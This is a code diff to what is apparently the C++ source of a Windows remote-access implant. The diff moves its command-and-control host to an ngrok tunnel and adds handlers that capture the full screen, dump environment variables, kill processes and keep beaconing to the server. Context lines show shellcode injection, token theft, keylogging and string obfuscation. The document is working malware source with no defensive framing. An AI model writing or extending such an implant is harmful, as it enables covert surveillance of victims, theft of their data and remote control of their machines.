@@ -45,7 +45,7 @@ static std::vector<BYTE> g_SessionKey;
 static HANDLE g_StolenToken    = NULL;  // primary token from steal_token
 static DWORD  g_BeaconOverride = 0;    // seconds; 0 = use config defaults
 
-// Derive 32-byte key as SHA-256(sessionId) — must match worker's deriveKey(sid)
+// Derive 32-byte key as SHA-256(sessionId)
 static std::vector<BYTE> DeriveKeyFromSessionId(const std::wstring& sessionId) {
     std::string utf8 = WStringToUTF8(sessionId);
     HCRYPTPROV hProv = 0;
@@ -217,7 +217,7 @@ static HttpResponse WinHttpRequest(
         return resp;
     }
 
-    DWORD timeout = 45000; // 45s — Cloudflare cold start can be slow
+    DWORD timeout = 45000;
     if (_SetOption) {
         _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
         _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
@@ -246,7 +246,8 @@ static HttpResponse WinHttpRequest(
     if (_SetOption) _SetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
 
     auto ctHdr = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
-    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + L"\r\n";
+    auto ngrokHdr = XSW(L"\r\nngrok-skip-browser-warning: true");
+    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + ngrokHdr.str() + L"\r\n";
     if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
     if (_AddHeaders)
         _AddHeaders(h.request, hdrs.c_str(),
@@ -376,7 +377,7 @@ static HttpResponse WinHttpDownload(const std::wstring& url) {
 static std::wstring GetC2Host() {
     static wchar_t host[64] = {};
     if (host[0] == L'\0') {
-        auto s = XSW(L"ghost-c2.sujallamichhane.workers.dev");
+        auto s = XSW(L"mute-attempt-fossil.ngrok-free.dev");
         wcsncpy_s(host, s.str(), _TRUNCATE);
     }
     return std::wstring(host);
@@ -628,7 +629,7 @@ static std::wstring HandleMigrate(const std::string& args) {
 }
 
 static std::wstring HandleInject(const std::string& args) {
-    // args: "<pid> <hex shellcode bytes space-separated>" or "<pid>" with payload from KV
+    // args: "<pid> <hex shellcode bytes space-separated>"
     size_t sp = args.find(' ');
     if (sp == std::string::npos) return L"Usage: !inject <pid> <hex bytes...>";
     DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
@@ -817,6 +818,100 @@ static std::wstring HandleKeylogDump(const std::string& /*args*/) {
 }
 
 // =====================================================================
+//  SCREENSHOT — GDI full-screen capture → BMP → base64
+// =====================================================================
+static std::wstring HandleScreenshot(const std::string& /*args*/) {
+    HDC hdcScreen = GetDC(NULL);
+    if (!hdcScreen) return L"[error: GetDC failed]";
+
+    int cx = GetSystemMetrics(SM_CXSCREEN);
+    int cy = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC     hdcMem = CreateCompatibleDC(hdcScreen);
+    HBITMAP hbmp   = CreateCompatibleBitmap(hdcScreen, cx, cy);
+    if (!hdcMem || !hbmp) {
+        if (hdcMem) DeleteDC(hdcMem);
+        if (hbmp)   DeleteObject(hbmp);
+        ReleaseDC(NULL, hdcScreen);
+        return L"[error: CreateCompatibleBitmap failed]";
+    }
+
+    HBITMAP hOld = static_cast<HBITMAP>(SelectObject(hdcMem, hbmp));
+    BitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, SRCCOPY | CAPTUREBLT);
+    SelectObject(hdcMem, hOld);
+    DeleteDC(hdcMem);
+    ReleaseDC(NULL, hdcScreen);
+
+    BITMAPINFOHEADER bi = {};
+    bi.biSize        = sizeof(BITMAPINFOHEADER);
+    bi.biWidth       = cx;
+    bi.biHeight      = -cy;   // top-down
+    bi.biPlanes      = 1;
+    bi.biBitCount    = 24;
+    bi.biCompression = BI_RGB;
+    DWORD rowBytes   = ((static_cast<DWORD>(cx) * 3 + 3) & ~3u);
+    bi.biSizeImage   = rowBytes * static_cast<DWORD>(cy);
+
+    std::vector<BYTE> pixels(bi.biSizeImage);
+    HDC hdcTmp = GetDC(NULL);
+    GetDIBits(hdcTmp, hbmp, 0, static_cast<UINT>(cy),
+              pixels.data(), reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);
+    ReleaseDC(NULL, hdcTmp);
+    DeleteObject(hbmp);
+
+    BITMAPFILEHEADER bfh = {};
+    bfh.bfType    = 0x4D42; // 'BM'
+    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    bfh.bfSize    = bfh.bfOffBits + bi.biSizeImage;
+
+    std::vector<BYTE> bmpFile(bfh.bfSize);
+    memcpy(bmpFile.data(),                    &bfh, sizeof(bfh));
+    memcpy(bmpFile.data() + sizeof(bfh),      &bi,  sizeof(bi));
+    memcpy(bmpFile.data() + bfh.bfOffBits,    pixels.data(), pixels.size());
+
+    std::string b64 = Base64Encode(bmpFile.data(), static_cast<DWORD>(bmpFile.size()));
+    return L"[SCREENSHOT:BMP]\n" + UTF8ToWString(b64);
+}
+
+// =====================================================================
+//  KILL PROCESS
+// =====================================================================
+static std::wstring HandleKillProcess(const std::string& args) {
+    if (args.empty()) return L"Usage: !kill <pid>";
+    DWORD pid = static_cast<DWORD>(atol(args.c_str()));
+    if (!pid) return L"[error: invalid pid]";
+    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (!h) return L"[error: OpenProcess pid=" + std::to_wstring(pid)
+                   + L" err=" + std::to_wstring(GetLastError()) + L"]";
+    BOOL ok = TerminateProcess(h, 1);
+    DWORD err = GetLastError();
+    CloseHandle(h);
+    return ok ? L"[+] Killed pid=" + std::to_wstring(pid)
+              : L"[error: TerminateProcess pid=" + std::to_wstring(pid)
+                + L" err=" + std::to_wstring(err) + L"]";
+}
+
+// =====================================================================
+//  ENV DUMP
+// =====================================================================
+static std::wstring HandleEnvDump(const std::string& /*args*/) {
+    LPWCH env = GetEnvironmentStringsW();
+    if (!env) return L"[error: GetEnvironmentStringsW]";
+    std::wstring out;
+    for (LPWCH p = env; *p; p += wcslen(p) + 1)
+        out += std::wstring(p) + L"\n";
+    FreeEnvironmentStringsW(env);
+    return out.empty() ? L"[env: empty]" : out;
+}
+
+// =====================================================================
+//  GETPID
+// =====================================================================
+static std::wstring HandleGetPid(const std::string& /*args*/) {
+    return L"PID: " + std::to_wstring(GetCurrentProcessId());
+}
+
+// =====================================================================
 //  COMMAND TABLE
 // =====================================================================
 struct CmdEntry {
@@ -846,6 +941,10 @@ static const CmdEntry kCmdTable[] = {
     { "!clipboard ",   false, HandleClipboard },
     { "!reverse ",     false, HandleReverse },
     { "!browser",      false, HandleBrowser },
+    { "!screenshot",   true,  HandleScreenshot },
+    { "!kill ",        false, HandleKillProcess },
+    { "!env",          true,  HandleEnvDump },
+    { "!getpid",       true,  HandleGetPid },
     { "exit",          true,  nullptr },
     { "sleep",         true,  nullptr }
 };
@@ -902,6 +1001,28 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
     }
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hRead);
     return UTF8ToWString(output);
+}
+
+// =====================================================================
+//  PING C2 — hit /health before starting the beacon loop.
+//  Retries indefinitely with exponential backoff (max 5 min).
+//  Returns TRUE on first 200 response.
+// =====================================================================
+BOOL PingC2() {
+    DWORD attempt = 0;
+    while (true) {
+        HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
+                                           L"GET", L"/health", "", L"");
+        if (resp.status == 200) {
+            DebugLog(L"PingC2: server reachable");
+            return TRUE;
+        }
+        ++attempt;
+        DWORD backoffSec = std::min(5u * (1u << std::min(attempt - 1u, 6u)), 300u);
+        DebugLog(L"PingC2: not reachable (attempt " + std::to_wstring(attempt)
+                 + L"), retrying in " + std::to_wstring(backoffSec) + L"s");
+        Sleep(backoffSec * 1000);
+    }
 }
 
 // =====================================================================
